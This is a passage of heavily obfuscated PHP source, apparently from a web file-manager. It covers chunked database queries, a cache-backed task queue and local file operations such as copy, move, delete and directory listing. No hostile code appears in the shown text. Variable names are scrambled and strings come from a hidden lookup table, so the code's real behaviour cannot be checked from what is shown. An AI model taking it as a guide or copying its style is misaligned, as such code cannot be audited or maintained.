$„ÛÒ‡óÚ; return; } return parent::add($„ÛÒ‡óÚ, $Æ‘Ôô, $š¼Ë“®); } public function parseWhereLike($ñîåÅÓ™, $Ñ‹èæôÚ = '', $İ¥Ùé² = false, &$Àñ®»ÆÇ = false) { $Œ¸¤³ú¬ =& $_SERVER[ıÚ˜š²İ]; $÷ıˆ¤Ñ¸ = $GLOBALS[$Œ¸¤³ú¬[6]][$Œ¸¤³ú¬[459]]; if (!$÷ıˆ¤Ñ¸[$Œ¸¤³ú¬[460]]) { return $ñîåÅÓ™; } if (!is_array($ñîåÅÓ™)) { return $ñîåÅÓ™; } $“‚Îñ ˆ = array(); $šíŞ‹‡ = 0; foreach ($ñîåÅÓ™ as $œ¨¼¦¯± => $½š£ºı) { if (is_array($½š£ºı) && count($½š£ºı) == 2 && $½š£ºı[0] == $Œ¸¤³ú¬[461] && is_string($½š£ºı[1]) && substr($½š£ºı[1], 0, 1) == $Œ¸¤³ú¬[462] && substr($½š£ºı[1], strlen($½š£ºı[1]) - 1, 1) == $Œ¸¤³ú¬[462]) { $Àñ®»ÆÇ = !0; $®¢‚Ğ©¸ = is_string($œ¨¼¦¯±) ? $œ¨¼¦¯± : $Ñ‹èæôÚ; $º¦¹Ğúš = substr($½š£ºı[1], 1, strlen($½š£ºı[1]) - 2); $º¦¹Ğúš = $this->db->escapeString($º¦¹Ğúš); if (!strpos($®¢‚Ğ©¸, $Œ¸¤³ú¬[10])) { $®¢‚Ğ©¸ = $Œ¸¤³ú¬[463] . $®¢‚Ğ©¸ . $Œ¸¤³ú¬[463]; } $Ü½êæò = $Œ¸¤³ú¬[223] . $º¦¹Ğúš . $Œ¸¤³ú¬[223]; $º¦¹Ğúš = str_replace(array($Œ¸¤³ú¬[10], $Œ¸¤³ú¬[464], $Œ¸¤³ú¬[11]), $Œ¸¤³ú¬[465], $º¦¹Ğúš); if ($÷ıˆ¤Ñ¸[$Œ¸¤³ú¬[466]]) { $Ü½êæò = $Œ¸¤³ú¬[467] . $º¦¹Ğúš . $Œ¸¤³ú¬[468]; if ($÷ıˆ¤Ñ¸[$Œ¸¤³ú¬[469]]) { $Ü½êæò = $Œ¸¤³ú¬[468] . $º¦¹Ğúš . $Œ¸¤³ú¬[467]; } } $“‚Îñ ˆ[$šíŞ‹‡] = $Œ¸¤³ú¬[470] . $®¢‚Ğ©¸ . $Œ¸¤³ú¬[471] . $Ü½êæò . $Œ¸¤³ú¬[472]; $šíŞ‹‡++; continue; } if (is_array($½š£ºı)) { $Ñ‹èæôÚ = is_string($œ¨¼¦¯±) ? $œ¨¼¦¯± : $Ñ‹èæôÚ; $½š£ºı = $this->parseWhereLike($½š£ºı, $Ñ‹èæôÚ, !0, $Àñ®»ÆÇ); } if (is_numeric($œ¨¼¦¯±)) { $“‚Îñ ˆ[$šíŞ‹‡] = $½š£ºı; $šíŞ‹‡++; } else { $“‚Îñ ˆ[$œ¨¼¦¯±] = $½š£ºı; } } if ($Àñ®»ÆÇ && !$İ¥Ùé²) { } return $“‚Îñ ˆ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($äÅ¥³¥ß = array()) { $©î¾ò«Ø =& $_SERVER[ıÚ˜š²İ]; $£ÚŸ•Ñû = self::SQL_WHERE_IN_CHUNK; $¯›Ş˜èÂ = $this->optionsValue(); $Š‚ ´ÄÇ = $this->findWhereField($¯›Ş˜èÂ); if (!$Š‚ ´ÄÇ || isset($¯›Ş˜èÂ[$©î¾ò«Ø[370]]) || isset($¯›Ş˜èÂ[$©î¾ò«Ø[430]])) { return parent::select($äÅ¥³¥ß); } $ã÷Àäƒ‡ = $¯›Ş˜èÂ[$©î¾ò«Ø[355]][$Š‚ ´ÄÇ][1]; $ã÷Àäƒ‡ = is_array($ã÷Àäƒ‡) ? $ã÷Àäƒ‡ : array(); $Ù¤¯ÛÎ = null; for ($¨Î§€çË = 0; $¨Î§€çË < count($ã÷Àäƒ‡); $¨Î§€çË += $£ÚŸ•Ñû) { $Ç¦¾şäú = array_slice($ã÷Àäƒ‡, $¨Î§€çË, $£ÚŸ•Ñû); if (!is_array($Ç¦¾şäú) || count($Ç¦¾şäú) == 0) { break; } $¯›Ş˜èÂ[$©î¾ò«Ø[355]][$Š‚ ´ÄÇ][1] = $Ç¦¾şäú; $this->optionsValue($¯›Ş˜èÂ); $•ğ¨ºçò = parent::select($äÅ¥³¥ß); if (!$•ğ¨ºçò) { continue; } $Ù¤¯ÛÎ = is_array($Ù¤¯ÛÎ) ? $Ù¤¯ÛÎ : array(); $Ù¤¯ÛÎ = array_merge($Ù¤¯ÛÎ, $•ğ¨ºçò); } return $Ù¤¯ÛÎ; } public function delete($é²™Ç±  = array()) { $·öÎßîÍ =& $_SERVER[ıÚ˜š²İ]; $ŒìÑÂÙ¥ = self::SQL_WHERE_IN_CHUNK; $†…êáõ¨ = $this->optionsValue(); $Ø‡é²× = $this->findWhereField($†…êáõ¨); if (!$Ø‡é²×) { return parent::delete($é²™Ç± ); } $¬İªñ³ã = 0; $ÑÌËû§³ = $†…êáõ¨[$·öÎßîÍ[355]][$Ø‡é²×][1]; $ÑÌËû§³ = is_array($ÑÌËû§³) ? $ÑÌËû§³ : array(); for ($·Ÿ‹¸êı = 0; $·Ÿ‹¸êı < count($ÑÌËû§³); $·Ÿ‹¸êı += $ŒìÑÂÙ¥) { $•‹ÄäÀÍ = array_slice($ÑÌËû§³, $·Ÿ‹¸êı, $ŒìÑÂÙ¥); if (!is_array($•‹ÄäÀÍ) || count($•‹ÄäÀÍ) == 0) { break; } $†…êáõ¨[$·öÎßîÍ[355]][$Ø‡é²×][1] = $•‹ÄäÀÍ; $this->optionsValue($†…êáõ¨); $¬İªñ³ã += parent::delete($é²™Ç± ); } return $¬İªñ³ã; } private function findWhereField($×™‹Ôñµ) { $¤·¹ÑÈ¶ =& $_SERVER[ıÚ˜š²İ]; $Õ¨§ûÒü = self::SQL_WHERE_IN_CHUNK; if (!is_array($×™‹Ôñµ) || !is_array($×™‹Ôñµ[$¤·¹ÑÈ¶[355]])) { return !1; } foreach ($×™‹Ôñµ[$¤·¹ÑÈ¶[355]] as $ìÇ…¬æ => $£´ñÉÏ½) { if (is_array($£´ñÉÏ½) && isset($£´ñÉÏ½[0]) && is_string($£´ñÉÏ½[0]) && strtolower($£´ñÉÏ½[0]) == $¤·¹ÑÈ¶[7] && is_array($£´ñÉÏ½[1]) && count($£´ñÉÏ½[1]) > $Õ¨§ûÒü) { ignore_timeout(); return $ìÇ…¬æ; } } return !1; } public function setMasterDB($ÒúôÅÍ± = true) { think_config($_SERVER[ıÚ˜š²İ][473], $ÒúôÅÍ±); } } goto b²é®³âĞ; e¯“÷ÚŒğÌ: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\x51\165\145\x75\145\114\x65\156\x67\x74\x68"; const QUEUE_DATA = "\x74\x61\x73\x6b\x51\x75\x65\165\x65\104\141\164\141"; const QUEUE_TIME = "\164\x61\x73\x6b\121\x75\145\x75\x65\114\141\x73\164\x52\165\x6e"; const QUEUE_THREAD = "\164\x61\x73\x6b\x51\165\x65\165\x65\124\150\162\x65\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ÊÒñµÇ½, $Ç¾•¡Åè = array(), $»öô†’€ = '', $âûâ×¾ = '') { $±ª“üä® =& $_SERVER[ıÚ˜š²İ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($âûâ×¾ && array_find_by_field(self::$listData, $±ª“üä®[97], $âûâ×¾)) { return !0; } if ($âûâ×¾ && array_find_by_field(self::$listDataAdd, $±ª“üä®[97], $âûâ×¾)) { return !0; } self::$listDataAdd[] = array($±ª“üä®[344] => $ÊÒñµÇ½, $±ª“üä®[1892] => $Ç¾•¡Åè, $±ª“üä®[528] => $»öô†’€, $±ª“üä®[97] => $âûâ×¾); return !0; } public static function addSubmit() { $¬ƒºŒ® =& $_SERVER[ıÚ˜š²İ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($¬ƒºŒ®[1893] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $¬ƒºŒ®[12], $¬ƒºŒ®[528])), $¬ƒºŒ®[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($÷Ïã½ª», $ëÒ©¹¢£ = array(), $Ú¾ÂÖ–î = '', $†ó•şõ‰ = '') { $”ï´×î° =& $_SERVER[ıÚ˜š²İ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $‡ôñô¤Á = self::getAll(); if ($†ó•şõ‰ && array_find_by_field($‡ôñô¤Á, $”ï´×î°[97], $†ó•şõ‰)) { return !0; } $‡ôñô¤Á[] = array($”ï´×î°[344] => $÷Ïã½ª», $”ï´×î°[1892] => $ëÒ©¹¢£, $”ï´×î°[528] => $Ú¾ÂÖ–î, $”ï´×î°[97] => $†ó•şõ‰); self::setAll($‡ôñô¤Á); write_log($”ï´×î°[1893] . $Ú¾ÂÖ–î, $”ï´×î°[198]); return !0; } public static function run() { $Ğ°Úûé =& $_SERVER[ıÚ˜š²İ]; $ğÔƒ‚ğ = self::getAll(); $òÀÕË¾ = array_shift($ğÔƒ‚ğ); if (!$òÀÕË¾) { return !1; } self::setAll($ğÔƒ‚ğ); $Ü•­ºÕ = timeFloat(); $õğï€æ = $Ğ°Úûé[12]; try { $õğï€æ = Hook::apply($òÀÕË¾[$Ğ°Úûé[344]], $òÀÕË¾[$Ğ°Úûé[1892]]); } catch (Exception $Úæíƒå) { write_log($Úæíƒå, $Ğ°Úûé[1278]); } $ÓíªÕÍë = number_format(timeFloat() - $Ü•­ºÕ, 3) . $Ğ°Úûé[1808]; if ($õğï€æ && is_string($õğï€æ)) { $ÓíªÕÍë = $ÓíªÕÍë . $Ğ°Úûé[1894] . $õğï€æ; } write_log($Ğ°Úûé[1895] . $òÀÕË¾[$Ğ°Úûé[528]] . $Ğ°Úûé[1896] . $ÓíªÕÍë, $Ğ°Úûé[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $¬Ï”½ó¹ =& $_SERVER[ıÚ˜š²İ]; $Ÿ¢­ç©î = self::threadCount() + 1; if ($Ÿ¢­ç©î > 3 || !self::count()) { return; } write_log($¬Ï”½ó¹[1897] . $Ÿ¢­ç©î, $¬Ï”½ó¹[198]); Cache::set(self::QUEUE_THREAD, $Ÿ¢­ç©î, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($¬Ï”½ó¹[1898], $¬Ï”½ó¹[198]); } public static function getKey($´ñçÏ÷˜, $À¢çèÈ = "\x69\x6e\x74") { $¤—•œ‹ =& $_SERVER[ıÚ˜š²İ]; Cache::removeMemory($´ñçÏ÷˜); $­”ŒµŸÁ = Cache::get($´ñçÏ÷˜); if ($À¢çèÈ == $¤—•œ‹[366]) { return $­”ŒµŸÁ ? intval($­”ŒµŸÁ) : 0; } if ($À¢çèÈ == $¤—•œ‹[1899]) { return is_array($­”ŒµŸÁ) ? $­”ŒµŸÁ : array(); } return $­”ŒµŸÁ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ıÚ˜š²İ][1899]); } public static function setAll($âÕ¸—Ÿ³) { $­öşÁßÄ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($âÕ¸—Ÿ³), $­öşÁßÄ); Cache::set(self::QUEUE_DATA, $âÕ¸—Ÿ³, $­öşÁßÄ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } $_file = $_SERVER[$_SERVER[ıÚ˜š²İ][960]]; $_size = $_SERVER[ıÚ˜š²İ][961]; goto FÈ†°ÊŒãÂ; DÆ—ÏƒÄ: define($_SERVER[ıÚ˜š²İ][320], 3); define($_SERVER[ıÚ˜š²İ][321], 1); define($_SERVER[ıÚ˜š²İ][322], 0); goto bôõ÷çÅù; Eäâêİ÷Î„: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($¤¥¹¦éÑ) { if (substr($¤¥¹¦éÑ, 0, 2) == $_SERVER[ıÚ˜š²İ][1432]) { $¤¥¹¦éÑ = BASIC_PATH . substr($¤¥¹¦éÑ, 2); } return $¤¥¹¦éÑ; } public function iconvApp($Ã·´÷­š) { $°šÈå°§ =& $_SERVER[ıÚ˜š²İ]; global $config; return $this->iconvTo($Ã·´÷­š, $config[$°šÈå°§[1461]], $config[$°šÈå°§[1460]]); } public function iconvSystem($Ò¢´‹©•) { $­­Å…Æ =& $_SERVER[ıÚ˜š²İ]; global $config; return $this->iconvTo($Ò¢´‹©•, $config[$­­Å…Æ[1460]], $config[$­­Å…Æ[1461]]); } public function getPathOuter($ÍòÊÄ¦ì) { $¨¼œ‡€ =& $_SERVER[ıÚ˜š²İ]; $Ø»ã¶¨† = $this->iconvApp($this->pathBase); $ÍòÊÄ¦ì = $this->iconvApp($ÍòÊÄ¦ì); if (substr($Ø»ã¶¨†, 0, 2) == $¨¼œ‡€[1432]) { $Ø»ã¶¨† = BASIC_PATH . substr($Ø»ã¶¨†, 2); } if (substr($ÍòÊÄ¦ì, 0, 2) == $¨¼œ‡€[1432]) { $ÍòÊÄ¦ì = BASIC_PATH . substr($ÍòÊÄ¦ì, 2); } $Ø»ã¶¨† = KodIO::clear($Ø»ã¶¨†); $ÍòÊÄ¦ì = KodIO::clear($ÍòÊÄ¦ì); $ÍòÊÄ¦ì = substr($ÍòÊÄ¦ì, strlen($Ø»ã¶¨†)); if (empty($this->pathDriver)) { return $ÍòÊÄ¦ì; } return $this->pathDriver . $¨¼œ‡€[8] . ltrim($ÍòÊÄ¦ì, $¨¼œ‡€[8]); } public function mkfile($„Ò•ÀÊñ, $ û³ÒÎì = '', $íÈÂã¢÷ = REPEAT_RENAME) { $„Ò•ÀÊñ = $this->iconvSystem($„Ò•ÀÊñ); @touch($„Ò•ÀÊñ); if ($ û³ÒÎì) { file_put_contents($„Ò•ÀÊñ, $ û³ÒÎì); } @chmod($„Ò•ÀÊñ, $this->pathAuth); if (is_file($„Ò•ÀÊñ)) { return $this->getPathOuter($„Ò•ÀÊñ); } $this->writeLog(__FUNCTION__ . $_SERVER[ıÚ˜š²İ][1472], !0); return !1; } public function mkdir($ÇºëôşÓ, $ ŞÔùÜœ = REPEAT_SKIP) { $ÇºëôşÓ = $this->iconvSystem($ÇºëôşÓ); if (is_dir($ÇºëôşÓ)) { return $this->getPathOuter($ÇºëôşÓ); } @mkdir($ÇºëôşÓ, $this->pathAuth, !0); @chmod($ÇºëôşÓ, $this->pathAuth); if (is_dir($ÇºëôşÓ)) { return $this->getPathOuter($ÇºëôşÓ); } $this->writeLog(__FUNCTION__ . $_SERVER[ıÚ˜š²İ][1472], !0); return !1; } public function copyFile($àÜ½§Ä÷, $Œ«İëÒ) { $this->mkdir($this->pathFather($Œ«İëÒ)); $àÜ½§Ä÷ = $this->iconvSystem($àÜ½§Ä÷); $Œ«İëÒ = $this->iconvSystem($Œ«İëÒ); $š ôØÎ‰ = copy_64($àÜ½§Ä÷, $Œ«İëÒ); @chmod($Œ«İëÒ, $this->pathAuth); if ($š ôØÎ‰) { return $this->getPathOuter($Œ«İëÒ); } $this->writeLog(__FUNCTION__ . $_SERVER[ıÚ˜š²İ][1472], !0); return !1; } public function moveFile($“ºš­¼», $„èÖµã) { $this->mkdir($this->pathFather($„èÖµã)); $“ºš­¼» = $this->iconvSystem($“ºš­¼»); $„èÖµã = $this->iconvSystem($„èÖµã); $ÑÍš¦» = intval(@rename($“ºš­¼», $„èÖµã)); if (!$ÑÍš¦») { if ($ÑÍš¦» = intval(@copy_64($“ºš­¼», $„èÖµã))) { @unlink($“ºš­¼»); } } @chmod($„èÖµã, $this->pathAuth); if ($ÑÍš¦») { return $this->getPathOuter($„èÖµã); } $this->writeLog(__FUNCTION__ . $_SERVER[ıÚ˜š²İ][1472], !0); return !1; } public function movePath($‹¯…Õã˜, $ß¢¸ã¿, $¥¦ÃÆ…º = false) { $¢‚¹¨Ï =& $_SERVER[ıÚ˜š²İ]; $‹¯…Õã˜ = $this->iconvSystem($‹¯…Õã˜); $ß¢¸ã¿ = $this->iconvSystem($ß¢¸ã¿); $ªüí»™Â = rtrim($ß¢¸ã¿, $¢‚¹¨Ï[8]) . $¢‚¹¨Ï[8] . ($¥¦ÃÆ…º ? $¥¦ÃÆ…º : get_path_this($‹¯…Õã˜)); if (file_exists($ªüí»™Â)) { return !1; } $ÆüèŞÙÍ = intval(@rename($‹¯…Õã˜, $ªüí»™Â)); $ÆüèŞÙÍ = file_exists($ªüí»™Â); if ($ÆüèŞÙÍ) { return $this->getPathOuter($ªüí»™Â); } $this->writeLog(__FUNCTION__ . $¢‚¹¨Ï[1472], !0); return !1; } public function delFile($¹Ëšùà—) { $¹Ëšùà— = $this->iconvSystem($¹Ëšùà—); if (!@unlink($¹Ëšùà—)) { @chmod($¹Ëšùà—, $this->pathAuth); if (@unlink($¹Ëšùà—)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[ıÚ˜š²İ][1472], !0); return !1; } return !0; } public function delFolder($ê®¹ñ¦Å) { $åæê À =& $_SERVER[ıÚ˜š²İ]; $ê®¹ñ¦Å = $this->iconvSystem($ê®¹ñ¦Å); if (!is_dir($ê®¹ñ¦Å)) { return !0; } if (!($í«–ñí = opendir($ê®¹ñ¦Å))) { return !1; } while (($Ù÷Àè¡ = readdir($í«–ñí)) !== !1) { if ($Ù÷Àè¡ == $åæê À[10] || $Ù÷Àè¡ == $åæê À[1377]) { continue; } $æ•Âñ¨œ = $ê®¹ñ¦Å . $åæê À[8] . $Ù÷Àè¡; if (is_file($æ•Âñ¨œ) || is_link($æ•Âñ¨œ)) { if (!unlink($æ•Âñ¨œ)) { chmod($æ•Âñ¨œ, $this->pathAuth); if (!unlink($æ•Âñ¨œ)) { return !1; } } } else { if (is_dir($æ•Âñ¨œ)) { chmod($æ•Âñ¨œ, $this->pathAuth); $æ•Âñ¨œ = $this->iconvApp($æ•Âñ¨œ); if (!$this->delFolder($æ•Âñ¨œ)) { return !1; } } } } closedir($í«–ñí); return rmdir($ê®¹ñ¦Å); } public function rename($ÎşõÇô§, $Ï’¹ÔôÉ) { $å˜¢èÔ° =& $_SERVER[ıÚ˜š²İ]; $•Òœš«Ø = $this->fileNameAuto($this->pathFather($ÎşõÇô§), $Ï’¹ÔôÉ); $•Òœš«Ø = $this->iconvSystem($•Òœš«Ø); $ÎşõÇô§ = $this->iconvSystem($ÎşõÇô§); $Œ«Âó = $this->pathFather($ÎşõÇô§); $ÌÎó¡¹â = rtrim($Œ«Âó, $å˜¢èÔ°[8]) . $å˜¢èÔ°[8] . $•Òœš«Ø; $ØÅ¯ìÈı = @rename($ÎşõÇô§, $ÌÎó¡¹â); $ÌÎó¡¹â = $this->iconvApp($ÌÎó¡¹â); if ($ØÅ¯ìÈı) { return $this->getPathOuter($ÌÎó¡¹â); } $this->writeLog(__FUNCTION__ . $å˜¢èÔ°[1472], !0); return !1; } public function size($ÇìÁÉ´‘) { $ÇìÁÉ´‘ = $this->iconvSystem($ÇìÁÉ´‘); return filesize_64($ÇìÁÉ´‘); } public function info($¯şœ½òØ) { $¯şœ½òØ = $this->iconvSystem($¯şœ½òØ); if ($this->isFolder($¯şœ½òØ)) { return $this->folderInfo($¯şœ½òØ); } else { if ($this->isFile($¯şœ½òØ)) { return $this->fileInfo($¯şœ½òØ); } } return !1; } protected function infoChildren($šñã²ÅÒ, &$û›¬šå, $©Şª°³¢ = true) { $™Ë—”íê =& $_SERVER[ıÚ˜š²İ]; check_abort_echo(); $šñã²ÅÒ = rtrim($šñã²ÅÒ, $™Ë—”íê[8]) . $™Ë—”íê[8]; if ($©Şª°³¢) { $šñã²ÅÒ = $this->iconvSystem($šñã²ÅÒ); } if (!($§ßØé» = @opendir($šñã²ÅÒ))) { return; } while (($äó½ìİş = readdir($§ßØé»)) !== !1) { if ($äó½ìİş == $™Ë—”íê[10] || $äó½ìİş == $™Ë—”íê[1377]) { continue; } $¯‘¿ª´® = $šñã²ÅÒ . $äó½ìİş; if (is_file($¯‘¿ª´®) || is_link($¯‘¿ª´®)) { $û›¬šå[$™Ë—”íê[80]]++; $û›¬šå[$™Ë—”íê[79]] += filesize_64($¯‘¿ª´®); } else { if (is_dir($¯‘¿ª´®)) { $û›¬šå[$™Ë—”íê[81]]++; $this->infoChildren($¯‘¿ª´®, $û›¬šå, !1); } } } closedir($§ßØé»); } private function folderInfo($Ï×¦ï®º, $ß÷è¥ß = false) { $¥‰ÏŠŸ§ =& $_SERVER[ıÚ˜š²İ]; $Ï×¦ï®º = rtrim($Ï×¦ï®º, $¥‰ÏŠŸ§[8]) . $¥‰ÏŠŸ§[8]; $‹å…Õ™ = $this->iconvApp($this->pathThis($Ï×¦ï®º)); if ($ß÷è¥ß) { return array($¥‰ÏŠŸ§[32] => $‹å…Õ™, $¥‰ÏŠŸ§[87] => $this->getPathOuter($Ï×¦ï®º), $¥‰ÏŠŸ§[33] => $¥‰ÏŠŸ§[78]); } $ù‡¨áÈÜ = array($¥‰ÏŠŸ§[32] => $‹å…Õ™, $¥‰ÏŠŸ§[87] => $this->getPathOuter($Ï×¦ï®º), $¥‰ÏŠŸ§[33] => $¥‰ÏŠŸ§[78], $¥‰ÏŠŸ§[234] => @filectime($Ï×¦ï®º), $¥‰ÏŠŸ§[88] => @filemtime($Ï×¦ï®º), $¥‰ÏŠŸ§[1476] => @fileatime($Ï×¦ï®º), $¥‰ÏŠŸ§[1477] => is_readable($Ï×¦ï®º), $¥‰ÏŠŸ§[1478] => is_writable($Ï×¦ï®º), $¥‰ÏŠŸ§[1479] => get_mode($Ï×¦ï®º)); return $ù‡¨áÈÜ; } private function fileInfo($Ø—ß­×, $¦²ô¤ÈÏ = false) { $ŒèÛ×Ùº =& $_SERVER[ıÚ˜š²İ]; $ùÍôéØ† = $this->iconvApp($this->pathThis($Ø—ß­×)); if ($¦²ô¤ÈÏ) { return array($ŒèÛ×Ùº[32] => $ùÍôéØ†, $ŒèÛ×Ùº[87] => $this->getPathOuter($Ø—ß­×), $ŒèÛ×Ùº[33] => $ŒèÛ×Ùº[233], $ŒèÛ×Ùº[79] => $this->size($Ø—ß­×), $ŒèÛ×Ùº[169] => $this->ext($ùÍôéØ†)); } $„ÎĞî´ˆ = array($ŒèÛ×Ùº[32] => $ùÍôéØ†, $ŒèÛ×Ùº[87] => $this->getPathOuter($Ø—ß­×), $ŒèÛ×Ùº[33] => $ŒèÛ×Ùº[233], $ŒèÛ×Ùº[234] => @filectime($Ø—ß­×), $ŒèÛ×Ùº[88] => @filemtime($Ø—ß­×), $ŒèÛ×Ùº[1476] => @fileatime($Ø—ß­×), $ŒèÛ×Ùº[79] => $this->size($Ø—ß­×), $ŒèÛ×Ùº[169] => $this->ext($ùÍôéØ†), $ŒèÛ×Ùº[1477] => is_readable($Ø—ß­×), $ŒèÛ×Ùº[1478] => is_writable($Ø—ß­×), $ŒèÛ×Ùº[1479] => get_mode($Ø—ß­×)); return $„ÎĞî´ˆ; } public function exist($É¦ú³‰æ) { $É¦ú³‰æ = $this->iconvSystem($É¦ú³‰æ); return @file_exists($É¦ú³‰æ); } public function isFile($ÒøÎáÈ) { $ÒøÎáÈ = $this->iconvSystem($ÒøÎáÈ); return @is_file($ÒøÎáÈ); } public function isFolder($êÉÒĞÙ¼) { $êÉÒĞÙ¼ = $this->iconvSystem($êÉÒĞÙ¼); return @is_dir($êÉÒĞÙ¼); } public function listPath($·‰ÒÙëÄ, $Ì›¬­¿ = false) { $×³Œ˜‘ =& $_SERVER[ıÚ˜š²İ]; $·‰ÒÙëÄ = $this->iconvSystem($·‰ÒÙëÄ); $·‰ÒÙëÄ = rtrim($·‰ÒÙëÄ, $×³Œ˜‘[8]) . $×³Œ˜‘[8]; $ö³äÔÌÌ = array($×³Œ˜‘[85] => array(), $×³Œ˜‘[86] => array()); if (!($æŸôé¿Ş = @opendir($·‰ÒÙëÄ))) { return $ö³äÔÌÌ; } while (($’ò¥Æš‚ = readdir($æŸôé¿Ş)) !== !1) { if ($’ò¥Æš‚ == $×³Œ˜‘[10] || $’ò¥Æš‚ == $×³Œ˜‘[1377]) { continue; } $ ıšÑî› = $·‰ÒÙëÄ . $’ò¥Æš‚; if (is_file($ ıšÑî›)) { $ö³äÔÌÌ[$×³Œ˜‘[86]][] = $this->fileInfo($ ıšÑî›, $Ì›¬­¿); } else { $ö³äÔÌÌ[$×³Œ˜‘[85]][] = $this->folderInfo($ ıšÑî›, $Ì›¬­¿); } } closedir($æŸôé¿Ş); return $ö³äÔÌÌ; } public function listAll($¯ÑÍ¶¦, &$Ò«ìÏ = array()) { $„”ÙÊş» =& $_SERVER[ıÚ˜š²İ]; $¯ÑÍ¶¦ = $this->iconvSystem($¯ÑÍ¶¦); $¯ÑÍ¶¦ = rtrim($¯ÑÍ¶¦, $„”ÙÊş»[8]) . $„”ÙÊş»[8]; if (!($˜˜Ô“æ² = @opendir($¯ÑÍ¶¦))) { return $Ò«ìÏ; } while (($ŒŒô®øµ = readdir($˜˜Ô“æ²)) !== !1) { if ($ŒŒô®øµ == $„”ÙÊş»[10] || $ŒŒô®øµ == $„”ÙÊş»[1377]) { continue; } $–ªŒóÈ = $¯ÑÍ¶¦ . $ŒŒô®øµ; $å›«İÏ = is_dir($–ªŒóÈ) && !is_link($–ªŒóÈ) ? 1 : 0; $–ªŒóÈ = $å›«İÏ ? $–ªŒóÈ . $„”ÙÊş»[8] : $–ªŒóÈ; $Ò«ìÏ[] = array($„”ÙÊş»[87] => $this->getPathOuter($–ªŒóÈ), $„”ÙÊş»[78] => $å›«İÏ, $„”ÙÊş»[88] => intval(@filemtime($–ªŒóÈ)), $„”ÙÊş»[79] => $å›«İÏ ? 0 : intval($this->size($–ªŒóÈ))); if ($å›«İÏ) { $this->listAll($–ªŒóÈ, $Ò«ìÏ); } } closedir($˜˜Ô“æ²); return $Ò«ìÏ; } public function has($Ø©ôÇ›Ù, $‘œ®©¥Ä = false, $æ¿šÎø = true) { $»ƒÊ¶‘ =& $_SERVER[ıÚ˜š²İ]; $Ø©ôÇ›Ù = $this->iconvSystem($Ø©ôÇ›Ù); $Ø©ôÇ›Ù = rtrim($Ø©ôÇ›Ù, $»ƒÊ¶‘[8]) . $»ƒÊ¶‘[8]; if (!($Æë¡˜ù× = @opendir($Ø©ôÇ›Ù))) { return !1; } $¥õª–äø = 0; $ÈÜ¶†ïı = 0; $¤ìş³£ = 0; while (($³Ñ™åÇİ = readdir($Æë¡˜ù×)) !== !1) { if ($³Ñ™åÇİ == $»ƒÊ¶‘[10] || $³Ñ™åÇİ == $»ƒÊ¶‘[1377]) { continue; } $óÆ’èç = $Ø©ôÇ›Ù . $³Ñ™åÇİ; if ($‘œ®©¥Ä) { $¤ìş³£++; if (@is_file($óÆ’èç)) { $¥õª–äø++; } else { $ÈÜ¶†ïı++; } if ($¤ìş³£ > 10000) { break; } continue; } if ($æ¿šÎø) { if (@is_file($óÆ’èç)) { return !0; } } else { if (@is_dir($óÆ’èç . $»ƒÊ¶‘[8])) { return !0; } } } closedir($Æë¡˜ù×); if ($‘œ®©¥Ä) { return array($»ƒÊ¶‘[242] => $¥õª–äø, $»ƒÊ¶‘[243] => $ÈÜ¶†ïı); } return !1; } public function hashSimple($Ã£ü¨¡) { $äÇ¨õ  =& $_SERVER[ıÚ˜š²İ]; if (!$Ã£ü¨¡) { return md5($äÇ¨õ [12]); } $Ã£ü¨¡ = $this->iconvSystem($Ã£ü¨¡); $®¸‡¿›â = $this->size($Ã£ü¨¡); $Ü©†º = 200; $€õ²ÍŸª = 50; if ($®¸‡¿›â <= $Ü©†º * $€õ²ÍŸª) { return $this->hashMd5($Ã£ü¨¡) . $®¸‡¿›â; } $ÁäÑƒ•É = $äÇ¨õ [12]; $’Öœâ§í = intval($®¸‡¿›â / $€õ²ÍŸª); $¦ÕĞÙÀ­ = fopen($Ã£ü¨¡, $äÇ¨õ [1480]); if (!$¦ÕĞÙÀ­) { return $ÁäÑƒ•É; } for ($üòèŒ„Á = 0; $üòèŒ„Á < $€õ²ÍŸª; $üòèŒ„Á++) { fseek_64($¦ÕĞÙÀ­, $’Öœâ§í * $üòèŒ„Á); $ÁäÑƒ•É .= fread($¦ÕĞÙÀ­, $Ü©†º); } fseek_64($¦ÕĞÙÀ­, $®¸‡¿›â - $Ü©†º); $ÁäÑƒ•É .= fread($¦ÕĞÙÀ­, $Ü©†º); fclose($¦ÕĞÙÀ­); return md5($ÁäÑƒ•É) . $®¸‡¿›â; } public function getContent($îå‚à•ñ) { $îå‚à•ñ = $this->iconvSystem($îå‚à•ñ); return file_get_contents($îå‚à•ñ); } public function setContent($å’ë°ú, $É«òïÂÕ = '') { $å’ë°ú = $this->iconvSystem($å’ë°ú); $ÀÍçê‡˜ = @file_put_contents($å’ë°ú, $É«òïÂÕ, LOCK_EX); if 